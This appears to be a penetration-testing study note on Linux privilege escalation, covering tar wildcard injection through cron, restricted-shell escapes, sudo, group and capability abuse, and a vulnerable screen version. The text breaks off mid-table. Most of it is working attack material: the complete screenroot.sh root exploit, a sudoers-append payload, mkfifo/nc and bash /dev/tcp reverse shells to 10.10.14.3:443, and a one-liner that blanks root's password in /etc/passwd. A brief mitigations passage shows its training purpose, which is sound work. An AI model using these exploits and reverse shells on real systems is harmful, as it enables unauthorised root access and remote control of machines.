A wildcard character can be used as a replacement for other characters and are interpreted by the shell before other actions. Examples of wild cards include:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Characters</th>
<th scope="col" class="org-left">Significance</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left"><code>*</code></td>
<td class="org-left">An asterisk that can match any number of characters in a file name.</td>
</tr>


<tr>
<td class="org-left"><code>?</code></td>
<td class="org-left">Matches a single character.</td>
</tr>


<tr>
<td class="org-left"><code>[ ]</code></td>
<td class="org-left">Brackets enclose characters and can match any single one at the defined position.</td>
</tr>


<tr>
<td class="org-left"><code>~</code></td>
<td class="org-left">A tilde at the beginning expands to the name of the user home directory or can have another username appended to refer to that user's home directory.</td>
</tr>


<tr>
<td class="org-left"><code>-</code></td>
<td class="org-left">A hyphen within brackets will denote a range of characters.</td>
</tr>
</tbody>
</table>

An example of how wildcards can be abused for privilege escalation is the `tar` command, a common program for creating/extracting archives. If we look at the man page for the `tar` command, we see the following:

    man tar
    
    <SNIP>
    Informative output
           --checkpoint[=N]
                  Display progress messages every Nth record (default 10).
    
           --checkpoint-action=ACTION
                  Run ACTION on each checkpoint.sh

The `--checkpoint-action` option permits an `EXEC` action to be executed when a checkpoint is reached (i.e., run an arbitrary operating system command once the tar command executes.) By creating files with these names, when the wildcard is specified, `--checkpoint=1` and `--checkpoint-action=exec=sh root.sh` is passed to `tar` as command-line options. Let's see this in practice.

Consider the following cron job, which is set up to back up the `/root` directory's contents and create a compressed archive in `/tmp`. The cron job is set to run every minute, so it is a good candidate for privilege escalation.

    #
    #
    mh dom mon dow command
    */01 * * * * cd /root && tar -zcf /tmp/backup.tar.gz *

We can leverage the wild card in the cron job to write out the necessary commands as file names with the above in mind. When the cron job runs, these file names will be interpreted as arguments and execute any commands that we specify.

    echo 'echo "user ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > root.sh
    echo "" > "--checkpoint-action=exec=sh root.sh"
    echo "" > --checkpoint=1

We can check and see that the necessary files were created.

    ls -la
    
    total 56
    drwxrwxrwt 10 root        root        4096 Aug 31 23:12 .
    drwxr-xr-x 24 root        root        4096 Aug 31 02:24 ..
    -rw-r--r--  1 root        root         378 Aug 31 23:12 backup.tar.gz
    -rw-rw-r--  1 user        user           1 Aug 31 23:11 --checkpoint=1
    -rw-rw-r--  1 user        user           1 Aug 31 23:11 --checkpoint-action=exec=sh root.sh
    drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .font-unix
    drwxrwxrwt  2 root        root        4096 Aug 31 22:36 .ICE-unix
    -rw-rw-r--  1 user        user          60 Aug 31 23:11 root.sh

Once the cron job runs again, we can check for the newly added sudo privileges and sudo to root directly.

      sudo -l
    
    Matching Defaults entries for cliff.moore on NIX02:
        env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User cliff.moore may run the following commands on NIX02:
        (root) NOPASSWD: ALL


<a id="orge65b171"></a>

## Escaping Restricted Shell

A restricted shell is a type of shell that limits the user's ability to execute commands. In a restricted shell, the user is only allowed to execute a specific set of commands or only allowed to execute commands in specific directories.

`Exemple Restricted Shell`

1.  **RBASH**
    [Restricted Bourne shell](https://www.gnu.org/software/bash/manual/html_node/The-Restricted-Shell.html)(`rbash`) is a restricted version of the Bourne shell, a standard command-line interpreter in
    Linux which limits the user's ability to use certain features of the Bourne shell, such as changing directories,
    setting or modifying environment variables, and executing commands in other directories. It is often used to
    provide a safe and controlled environment for users who may accidentally or intentionally damage the system.
    Utils command:
    
        compgen -c # List all possible usage command
        ssh user@server_name-t "bash --noprofile" #change rbash to bash
    
    a) start bash without source'ing either ~/.bashrc or ~/.bash<sub>profile</sub> 
    b) since such a shell wouldn't be a full login shell / have no tty attached, force ssh to attach a tty:

2.  **RKSH**
    [Restricted Korn Shell](https://www.ibm.com/docs/en/aix/7.2?topic=r-rksh-command)(`rksh`) is a restricted version of the Korn shell, another standard command-line interpreter.
    The `rksh` shell limits the user's ability to use certain features of the Korn shell, such as executing commands in
    other directories, creating or modifying shell functions, and modifying the shell environment.
3.  **RZSH**
    [Restricted Z shell](https://manpages.debian.org/experimental/zsh/rzsh.1.en.html)(`rzsh`) is a restricted version of the Z shell and is the most powerful and flexible command-line
    interpreter. The `rzsh` shell limits the user's ability to use certain features of the Z shell, such as running
    shell scripts, defining aliases, and modifying the shell environment.

`Escaping`

1.  `Command Injection`
    For example, we could use the following command to inject a pwd command into the argument of the ls command:
    
        ls -l `pwd`
    
    This command would cause the ls command to be executed with the argument -l, followed by the output of the pwd
    command. Since the pwd command is not restricted by the shell, this would allow us to execute the pwd command and
    see the current working directory, even though the shell does not allow us to execute the pwd command directly.
2.  `Command Substitution`
    Another method for escaping from a restricted shell is to use command substitution. This involves using the
    shell's command substitution syntax to execute a command. For example, imagine the shell allows users to execute
    commands by enclosing them in backticks (\`). In that case, it may be possible to escape from the shell by
    executing a command in a backtick substitution that is not restricted by the shell.
3.  `Command Chaining`
    In some cases, it may be possible to escape from a restricted shell by using command chaining. We would need to
    use multiple commands in a single command line, separated by a shell metacharacter, such as a semicolon (;) or a
    vertical bar (|), to execute a command. For example, if the shell allows users to execute commands separated by
    semicolons, it may be possible to escape from the shell by using a semicolon to separate two commands, one of
    which is not restricted by the shell.
4.  `Environment Variables`
    For escaping from a restricted shell to use environment variables involves modifying or creating environment
    variables that the shell uses to execute commands that are not restricted by the shell. For example, if the shell
    uses an environment variable to specify the directory in which commands are executed, it may be possible to escape
    from the shell by modifying the value of the environment variable to specify a different directory.
5.  `Shell Functions`
    In some cases, it may be possible to escape from a restricted shell by using shell functions. For this we can define and call shell functions that
    execute commands not restricted by the shell. Let us say, the shell allows users to define and call shell functions, it may be possible to escape
    from the shell by defining a shell function that executes a command.


<a id="org11b5dd7"></a>

# Permissions-based Privilege Escalation


<a id="org028595a"></a>

## Special Permisions


<a id="org7e850c5"></a>

### `setuid`

The `Set User ID upon Execution (setuid)` permission can allow a user to execute a program or script with the permissions of another user, typically with elevated privileges. The `setuid` bit appears as an `s`

    find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null

It may be possible to reverse engineer the program with the SETUID bit set, identify a vulnerability, and exploit this to escalate our privileges. Many programs have additional features that can be leveraged to execute commands and, if the setuid bit is set on them, these can be used for our purpose.


<a id="org5ef7a5c"></a>

### `setgiu`

The `Set-Group-ID (setgid)` permission is another special permission that allows us to run binaries as if we were part of the group that created them. These files can be enumerated using the following command:

    find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null

This [resource](https://linuxconfig.org/how-to-use-special-permissions-the-setuid-setgid-and-sticky-bits) has more information about the setuid and setgid bits, including how to set the bits.


<a id="org62b20ef"></a>

## Sudo Rights Abuse

Sudo privileges can be granted to an account, permitting the account to run certain commands in the context of the root (or another account) without having to change users or grant excessive privileges. When the `sudo` command is issued, the system will check if the user issuing the command has the appropriate rights, as configured in /etc/sudoers. When landing on a system, we should always check to see if the current user has any sudo privileges by typing `sudo -l`. Sometimes we will need to know the user's password to list their `sudo` rights, but any rights entries with the `NOPASSWD` option can be seen without entering a password.

    sudo -l
    
    Matching Defaults entries for sysadm on NIX02:
          env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
    
    User sysadm may run the following commands on NIX02:
          (root) NOPASSWD: /usr/sbin/tcpdump

For example, if the sudoers file is edited to grant a user the right to run a command such as `tcpdump` per the following entry in the sudoers file: `(ALL) NOPASSWD: /usr/sbin/tcpdump` an attacker could leverage this to take advantage of a the **postrotate-command** option.

By specifying the `-z` flag, an attacker could use `tcpdump` to execute a shell script, gain a reverse shell as the root user or run other privileged commands. For example, an attacker could create the shell script `.test` containing a reverse shell and execute it as follows:

    sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root

Let's try this out. First, make a file to execute with the `postrotate-command`, adding a simple reverse shell one-liner.

    cat /tmp/.test
    
    rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.3 443 >/tmp/f


<a id="org7e0f660"></a>

### Mitigations

[AppArmor](https://wiki.ubuntu.com/AppArmor) in more recent distributions has predefined the commands used with the `postrotate-command`, effectively preventing command execution. Two best practices that should always be considered when provisioning `sudo` rights:

1.  Always specify the absolute path to any binaries listed in the `sudoers` file entry. Otherwise, an attacker may be
    able to leverage PATH abuse (which we will see in the next section) to create a malicious binary that will be
    executed when the command runs (i.e., if the `sudoers` entry specifies `cat` instead of `/bin/cat` this could likely be
    abused).
2.  Grant `sudo` rights sparingly and based on the principle of least privilege. Does the user need full `sudo` rights?
    Can they still perform their job with one or two entries in the `sudoers` file? Limiting the privileged command that
    a user can run will greatly reduce the likelihood of successful privilege escalation.


<a id="org8048c5b"></a>

## Privileged Groups


<a id="org6ddefc3"></a>

### LXC/LXD

LXD is similar to Docker and is Ubuntu's container manager. Upon installation, all users are added to the LXD group. Membership of this group can be used to escalate privileges by creating an LXD container, making it privileged, and then accessing the host file system at `/mnt/root`. Let's confirm group membership and use these rights to escalate to root.

    id
    
    uid=1009(devops) gid=1009(devops) groups=1009(devops),110(lxd)

Unzip an image for axample `Alpine` (Ubuntu distibutions)

    unzip alpine.zip

Start the `LXD initialization process`. Choose the defaults for each prompt. Consult this [post](https://www.digitalocean.com/community/tutorials/how-to-set-up-and-use-lxd-on-ubuntu-16-04) for more information on each step.

    lxd init
    
    Do you want to configure a new storage pool (yes/no) [default=yes]? yes
    Name of the storage backend to use (dir or zfs) [default=dir]: dir
    Would you like LXD to be available over the network (yes/no) [default=no]? no
    Do you want to configure the LXD bridge (yes/no) [default=yes]? yes
    
    /usr/sbin/dpkg-reconfigure must be run as root
    error: Failed to configure the bridge

`Import` the local image

    lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

`Start` a  privileged container with the `security.privilege` set to `true` to run container without a UID mapping making the root user in the container the same as the root user on the host

    lxc init alpine r00t -c security.privileged=true
    
    Creating r00t

`Mount` the host file system

    lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
    
    Device mydev added to r00t

Finally, spawn a shell inside the container instance. We can now browse the mounted host file system as root.

    lxc start r00t
    lxc exec r00t /bin/sh


<a id="org9a17bae"></a>

### Docker

Placing a user in the docker group is essentially equivalent to root level access to the file system without requiring a password. Members of the docker group can spawn new docker containers. One example would be running the command `docker run -v /root:/mnt -it ubuntu`. This command create a new Docker instance with the /root directory on the host file system mounted as a volume. Once the container is started we are able to browse to the mounted directory and retrieve or add SSH keys for the root user.


<a id="orgc2cae37"></a>

### Disk

Users within the disk group have full access to any devices contained within `/dev`, such as `/dev/sda1`, which is typically the main device used by the operating system. An attacker with these privileges can use `debugfs` to access the entire file system with root level privileges. As with the Docker group example, this could be leveraged to retrieve SSH keys, credentials or to add a user.


<a id="org0d00eaf"></a>

### ADM

Members of the adm group are able to read all logs stored in `/var/log`. This does not directly grant root access, but could be leveraged to gather sensitive data stored in log files or enumerate user actions and running cron jobs.

    id
    
    uid=1010(secaudit) gid=1010(secaudit) groups=1010(secaudit),4(adm)


<a id="org0f6d043"></a>

## Capabilities

Linux capabilities are a security feature in the Linux operating system that allows specific privileges to be granted to processes, allowing them to perform specific actions that would otherwise be restricted. This allows for more fine-grained control over which processes have access to certain privileges, making it more secure than the traditional Unix model of granting privileges to users and groups.


<a id="org85464aa"></a>

### Set Capability

    sudo setcap cap_net_bind_service=+ep /usr/bin/vim.basic

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Capability</th>
<th scope="col" class="org-left">Desciption</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">cap<sub>sys</sub><sub>admin</sub></td>
<td class="org-left">Allows to perform actions with administrative privileges, such as modifying system files or changing system settings.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>sys</sub><sub>chroot</sub></td>
<td class="org-left">Allows to change the root directory for the current process, allowing it to access files and directories that would otherwise be inaccessible.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>sys</sub><sub>ptrace</sub></td>
<td class="org-left">Allows to attach to and debug other processes, potentially allowing it to gain access to sensitive information or modify the behavior of other processes.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>sys</sub><sub>nice</sub></td>
<td class="org-left">Allows to raise or lower the priority of processes, potentially allowing it to gain access to resources that would otherwise be restricted.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>sys</sub><sub>time</sub></td>
<td class="org-left">Allows to modify the system clock, potentially allowing it to manipulate timestamps or cause other processes to behave in unexpected ways.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>sys</sub><sub>resource</sub></td>
<td class="org-left">Allows to modify system resource limits, such as the maximum number of open file descriptors or the maximum amount of memory that can be allocated.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>sys</sub><sub>module</sub></td>
<td class="org-left">Allows to load and unload kernel modules, potentially allowing it to modify the operating system's behavior or gain access to sensitive information.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>net</sub><sub>bind</sub><sub>service</sub></td>
<td class="org-left">Allows to bind to network ports, potentially allowing it to gain access to sensitive information or perform unauthorized actions.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>
</tbody>
</table>

Here are some examples of values that we can use with the `setcap` command, along with a brief description of what they do:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Capability Values</th>
<th scope="col" class="org-left">Desciption</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left"><code>=</code></td>
<td class="org-left">This value sets the specified capability for the executable, but does not grant any privileges. This can be useful if we want to clear a previously set capability for the executable.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left"><code>+ep</code></td>
<td class="org-left">This value grants the effective and permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left"><code>+ei</code></td>
<td class="org-left">This value grants sufficient and inheritable privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows and child processes spawned by the executable to inherit the capability and perform the same actions.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left"><code>+p</code></td>
<td class="org-left">This value grants the permitted privileges for the specified capability to the executable. This allows the executable to perform the actions that the capability allows but does not allow it to perform any actions that are not allowed by the capability. This can be useful if we want to grant the capability to the executable but prevent it from inheriting the capability or allowing child processes to inherit it.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>
</tbody>
</table>

Several Linux capabilities can be used to escalate a user's privileges to `root`, including:

<table border="2" cellspacing="0" cellpadding="6" rules="groups" frame="hsides">


<colgroup>
<col  class="org-left" />

<col  class="org-left" />
</colgroup>
<thead>
<tr>
<th scope="col" class="org-left">Capability</th>
<th scope="col" class="org-left">Desciption</th>
</tr>
</thead>

<tbody>
<tr>
<td class="org-left">cap<sub>setuid</sub></td>
<td class="org-left">Allows a process to set its effective user ID, which can be used to gain the privileges of another user, including the root user.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>setgid</sub></td>
<td class="org-left">Allows to set its effective group ID, which can be used to gain the privileges of another group, including the root group.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>sys</sub><sub>admin</sub></td>
<td class="org-left">This capability provides a broad range of administrative privileges, including the ability to perform many actions reserved for the root user, such as modifying system settings and mounting and unmounting file systems.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>


<tr>
<td class="org-left">cap<sub>dac</sub><sub>override</sub></td>
<td class="org-left">Allows bypassing of file read, write, and execute permission checks.</td>
</tr>


<tr>
<td class="org-left">&#xa0;</td>
<td class="org-left">&#xa0;</td>
</tr>
</tbody>
</table>


<a id="orga5208a4"></a>

### Enumerating Capabilities

It is important to note that these capabilities should be used with caution and only granted to trusted processes, as they can be misused to gain unauthorized access to the system. To enumerate all existing capabilities for all existing binary executables on a Linux system, we can use the following command:

1.  Enumeration

        find /usr/bin /usr/sbin /usr/local/bin /usr/local/sbin -type f -exec getcap {} \;
        
        /usr/bin/vim.basic cap_dac_override=eip
        /usr/bin/ping cap_net_raw=ep
        /usr/bin/mtr-packet cap_net_raw=ep
    
    This one-liner uses the find command to search for all binary executables in the directories where they are typically located and then uses the -exec flag to run the getcap command on each, showing the capabilities that have been set for that binary.

2.  Exploitation

    If we gained access to the system with a low-privilege account, then discovered the `dac_cap_override` capability:
    
        getcap /usr/bin/vim.basic
        
        /usr/bin/vim.basic cap_dac_override=eip
    
    For example, the `/usr/bin/vim.basic` binary is run without special privileges, such as with `sudo`. However, because the binary has the `cap_dac_override` capability set, it can escalate the privileges of the user who runs it. This would allow the penetration tester to gain the `cap_dac_override` capability and perform tasks that require this capability.
    
    Let us take a look at the `/etc/passwd` file where the user `root` is specified:
    
        cat /etc/passwd | head -n1
        
        root:x:0:0:root:/root:/bin/bash
    
    We can use the `cap_dac_override` capability of the `/usr/bin/vim` binary to modify a system file:
    
        /usr/bin/vim.basic /etc/passwd
    
    We also can make these changes in a non-interactive mode:
    
        echo -e ':%s/^root:[^:]*:/root::/\nwq' | /usr/bin/vim.basic -es /etc/passwd
        Matthheeww@htb[/htb]$ cat /etc/passwd | head -n1
        
        root::0:0:root:/root:/bin/bash
    
    Now, we can see that the `x` in that line is gone, which means that we can use the command `su` to log in as root without being asked for the password.


<a id="orgeca8b6f"></a>

# Service-based Privilege Escalation


<a id="orge276c0c"></a>

## Vulnerable Services

Many services may be found, which have flaws that can be leveraged to escalate privileges. An example is the popular terminal multiplexer [Screen](https://linux.die.net/man/1/screen). Version 4.5.0 suffers from a privilege escalation vulnerability due to a lack of a permissions check when opening a log file.
**Screen Version Identification**

    screen -v
    
    Screen version 4.05.00 (GNU) 10-Dec-16  

This allows an attacker to truncate any file or create a file owned by root in any directory and ultimately gain full root access.

**Privilege Escalation - Screen<sub>Exploit.sh</sub>**

    ./screen_exploit.sh 
    
    ~ gnu/screenroot ~
    [+] First, we create our shell and library...
    [+] Now we create our /etc/ld.so.preload file...
    [+] Triggering...
    ' from /etc/ld.so.preload cannot be preloaded (cannot open shared object file): ignored.
    [+] done!
    No Sockets found in /run/screen/S-mrb3n.
    
    # id
    uid=0(root) gid=0(root)
    groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare),1000(mrb3n)

The below script can be used to perform this privilege escalation attack:

    #!/bin/bash
    # screenroot.sh
    # setuid screen v4.5.0 local root exploit
    # abuses ld.so.preload overwriting to get root.
    # bug: https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html
    # HACK THE PLANET
    # ~ infodox (25/1/2017)
    echo "~ gnu/screenroot ~"
    echo "[+] First, we create our shell and library..."
    cat << EOF > /tmp/libhax.c
    #include <stdio.h>
    #include <sys/types.h>
    #include <unistd.h>
    #include <sys/stat.h>
    __attribute__ ((__constructor__))
    void dropshell(void){
        chown("/tmp/rootshell", 0, 0);
        chmod("/tmp/rootshell", 04755);
        unlink("/etc/ld.so.preload");
        printf("[+] done!\n");
    }
    EOF
    gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
    rm -f /tmp/libhax.c
    cat << EOF > /tmp/rootshell.c
    #include <stdio.h>
    int main(void){
        setuid(0);
        setgid(0);
        seteuid(0);
        setegid(0);
        execvp("/bin/sh", NULL, NULL);
    }
    EOF
    gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
    rm -f /tmp/rootshell.c
    echo "[+] Now we create our /etc/ld.so.preload file..."
    cd /etc
    umask 000 # because
    screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so" # newline needed
    echo "[+] Triggering..."
    screen -ls # screen itself is setuid, so...
    /tmp/rootshell


<a id="org2f27867"></a>

## Cron Job Abuse

Cron jobs can also be set run one time (such as on boot). They are typically used for administrative tasks such as running backups, cleaning up directories, etc. The `crontab` command can create a cron file, which will be run by the cron daemon on the schedule specified. When created, the cron file will be created in `/var/spool/cron` for the specific user that creates it. Each entry in the crontab file requires six items in the following order: minutes, hours, days, months, weeks, commands. For example, the entry `0 */12 * * * /home/admin/backup.sh` would run every 12 hours.

Certain applications create cron files in the `/etc/cron.d` directory and may be misconfigured to allow a non-root user to edit them.

**Find Cron in System**

    find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
    
    /etc/cron.daily/backup
    /dmz-backups/backup.sh
    /proc
    /sys/fs/cgroup/memory/init.scope/cgroup.event_control
    
    <SNIP>
    /home/backupsvc/backup.sh

A quick look in the `/dmz/backups` directory shows what appears to be files created every three minutes. This seems to be a major misconfiguration
Perhaps the sysadmin meant to specify every three hours like `0 */3 * * *` but instead wrote `*/3 * * * *`, which tells the cron job to run every three minutes. The second issue is that the `backup.sh` shell script is world writeable and runs as root.

    ls -la /dmz-backups/
    
    total 36
    drwxrwxrwx  2 root root 4096 Aug 31 02:39 .
    drwxr-xr-x 24 root root 4096 Aug 31 02:24 ..
    -rwxrwxrwx  1 root root  230 Aug 31 02:39 backup.sh
    -rw-r--r--  1 root root 3336 Aug 31 02:24 www-backup-2020831-02:24:01.tgz
    -rw-r--r--  1 root root 3336 Aug 31 02:27 www-backup-2020831-02:27:01.tgz
    -rw-r--r--  1 root root 3336 Aug 31 02:30 www-backup-2020831-02:30:01.tgz
    -rw-r--r--  1 root root 3336 Aug 31 02:33 www-backup-2020831-02:33:01.tgz
    -rw-r--r--  1 root root 3336 Aug 31 02:36 www-backup-2020831-02:36:01.tgz
    -rw-r--r--  1 root root 3336 Aug 31 02:39 www-backup-2020831-02:39:01.tgz

We can confirm that a cron job is running using [pspy](https://github.com/DominicBreuker/pspy), a command-line tool used to view running processes without the need for root privileges. We can use it to see commands run by other users, cron jobs, etc. It works by scanning [procfs](https://en.wikipedia.org/wiki/Procfs).
Let's run `pspy` and have a look. The `-pf` flag tells the tool to print commands and file system events and `-i 1000` tells it to scan profcs every 1000ms (or every second).

    ./pspy64 -pf -i 1000
    
    pspy - version: v1.2.0 - Commit SHA: 9c63e5d6c58f7bcdc235db663f5e3fe1c33b8855
    
    
         ██▓███    ██████  ██▓███ ▓██   ██▓
        ▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
        ▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
        ▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
        ▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
        ▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
        ░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
        ░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                       ░           ░ ░     
                                   ░ ░     
    
    Config: Printing events (colored=true): processes=true | file-system-events=true ||| Scannning for processes every 1s and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
    Draining file system events due to startup...
    done
    2020/09/04 20:45:03 CMD: UID=0    PID=999    | /usr/bin/VGAuthService 
    2020/09/04 20:45:03 CMD: UID=111  PID=990    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation 
    2020/09/04 20:45:03 CMD: UID=0    PID=99     | 
    2020/09/04 20:45:03 CMD: UID=0    PID=988    | /usr/lib/snapd/snapd 
    
    <SNIP>
    
    2020/09/04 20:45:03 CMD: UID=0    PID=1017   | /usr/sbin/cron -f 
    2020/09/04 20:45:03 CMD: UID=0    PID=1010   | /usr/sbin/atd -f 
    2020/09/04 20:45:03 CMD: UID=0    PID=1003   | /usr/lib/accountsservice/accounts-daemon 
    2020/09/04 20:45:03 CMD: UID=0    PID=1001   | /lib/systemd/systemd-logind 
    2020/09/04 20:45:03 CMD: UID=0    PID=10     | 
    2020/09/04 20:45:03 CMD: UID=0    PID=1      | /sbin/init 
    2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
    2020/09/04 20:46:01 CMD: UID=0    PID=2201   | /bin/bash /dmz-backups/backup.sh 
    2020/09/04 20:46:01 CMD: UID=0    PID=2200   | /bin/sh -c /dmz-backups/backup.sh 
    2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
    2020/09/04 20:46:01 CMD: UID=0    PID=2199   | /usr/sbin/CRON -f 
    2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
    2020/09/04 20:46:01 CMD: UID=0    PID=2203   | 
    2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
    2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
    2020/09/04 20:46:01 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
    2020/09/04 20:46:01 CMD: UID=0    PID=2204   | tar --absolute-names --create --gzip --file=/dmz-backups/www-backup-202094-20:46:01.tgz /var/www/html 
    2020/09/04 20:46:01 FS:                 OPEN | /usr/lib/locale/locale-archive
    2020/09/04 20:46:01 CMD: UID=0    PID=2205   | gzip 
    2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive
    2020/09/04 20:46:03 CMD: UID=0    PID=2206   | /bin/bash /dmz-backups/backup.sh 
    2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/x86_64-linux-gnu/gconv/gconv-modules.cache
    2020/09/04 20:46:03 FS:        CLOSE_NOWRITE | /usr/lib/locale/locale-archive

We can look at the shell script and append a command to it to attempt to obtain a reverse shell as root. If editing a script, make sure to `ALWAYS` take a copy of the script and/or create a backup of it. We should also attempt to append our commands to the end of the script to still run properly before executing our reverse shell command.

    cat /dmz-backups/backup.sh 
    
    #!/bin/bash
     SRCDIR="/var/www/html"
     DESTDIR="/dmz-backups/"
     FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
     tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR

We can see that the script is just taking in a source and destination directory as variables. It then specifies a file name with the current date and time of backup and creates a tarball of the source directory, the web root directory. Let's modify the script to add a [Bash one-liner reverse shell](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet).

    #!/bin/bash
    SRCDIR="/var/www/html"
    DESTDIR="/dmz-backups/"
    FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
    tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
    
    bash -i >& /dev/tcp/10.10.14.3/443 0>&1

We modify the script, stand up a local netcat `listener`, and wait. Sure enough, within three minutes, we have a root shell!

    nc -lnvp 443


<a id="org66fcd6b"></a>

## LXD

`Containers`
Containers operate at the operating system level and virtual machines at the hardware level. Containers thus share an operating system and isolate application processes from the rest of the system, while classic virtualization allows multiple operating systems to run simultaneously on a single system.

`Linux Container`
Linux Containers (`LXC`) is an operating system-level virtualization technique that allows multiple Linux systems to run in isolation from each other on a single host by owning their own processes but sharing the host system kernel for them.
The ease of use of `LXC` is their most significant advantage compared to classic virtualization techniques.

`Linux Demon`
Linux Daemon (LXD) is similar in some respects but is designed to contain a complete operating system. Thus it is not an application container but a system container. Before we can use this service to escalate our privileges, we must be in either the `lxc` or `lxd` group. We can find this out with the following command:

    id
    
    uid=1000(container-user) gid=1000(container-user) groups=1000(container-user),116(lxd)

`Find Image`
**From here on**, there are now several ways in which we can exploit LXC/LXD. We can either create our own container and transfer it to the target system or use an existing container. Unfortunately, administrators often use templates that have little to no security. This attitude has the consequence that we already have tools that we can use against the system ourselves.

    cd ContainerImages
    ls
    
    ubuntu-template.tar.xz

`Import Image`
Such templates often do not have passwords, especially if they are uncomplicated test environments. These should be quickly accessible and uncomplicated to use.
If we are a little lucky and there is such a container on the system, it can be exploited. For this, we need to `import this container` as an image.

    lxc image import ubuntu-template.tar.xz --alias ubuntutemp
    lxc image list
    
    +-------------------------------------+--------------+--------+-----------------------------------------+--------------+-----------------+-----------+-------------------------------+
    |                ALIAS                | FINGERPRINT  | PUBLIC |               DESCRIPTION               | ARCHITECTURE |      TYPE       |   SIZE    |          UPLOAD DATE          |
